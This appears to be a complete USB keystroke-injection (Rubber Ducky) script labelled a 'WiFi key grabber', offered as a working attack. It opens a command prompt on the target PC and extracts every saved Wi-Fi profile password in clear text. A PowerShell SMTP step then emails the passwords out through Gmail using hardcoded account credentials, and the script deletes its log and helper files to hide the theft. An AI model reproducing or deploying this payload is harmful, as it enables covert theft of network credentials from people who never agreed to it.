DELAY 2
REM --> Minimize all windows
Delay 1
WINDOWS d
REM --> Open cmd
WINDOWS r
DELAY 5
STRING cmd
ENTER
DELAY 7
REM --> Get all SSID
STRING cd %USERPROFILE% & netsh wlan show profiles | findstr "All" > a.txt
ENTER
REM --> Create a filter.bat to get all the profile names
STRING echo setlocal enabledelayedexpansion^
ENTER
ENTER
STRING for /f "tokens=6*" %%i in (a.txt) do (^
ENTER
ENTER
STRING set val=%%i %%j^
ENTER
ENTER
STRING if "!val:~-1!" == " " set val=!val:~0,-1!^
ENTER
ENTER
STRING echo !val!^>^>b.txt) > filter.bat
ENTER
REM --> Run filter.bat and save all profile names in b.txt
STRING filter.bat
DELAY 3
ENTER
REM --> Save all the good stuff in Log.txt and delete the other garbage files
STRING (for /f "tokens=*" %i in (b.txt) do @echo     SSID: %i & netsh wlan show profiles name="%i" key=clear | findstr /c:"Key Content" & echo.) > Log.txt
ENTER
DELAY 1
STRING del a.txt b.txt filter.bat
ENTER
REM --> Mail Log.txt
STRING powershell
ENTER
DELAY 1
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPClient.EnableSSL = $true
ENTER
STRING $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("totechwithit@gmail.com", "Blogtime")
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = "your email"
ENTER
STRING $ReportEmail.To.Add "your email"
ENTER
STRING $ReportEmail.Subject = 'WiFi key grabber'
ENTER
STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
ENTER
STRING $SMTPClient.Send($ReportEmail) 
ENTER
DELAY 3
STRING exit
ENTER
DELAY 5
REM --> Delete Log.txt and exit
STRING del Log.txt & exit
ENTER
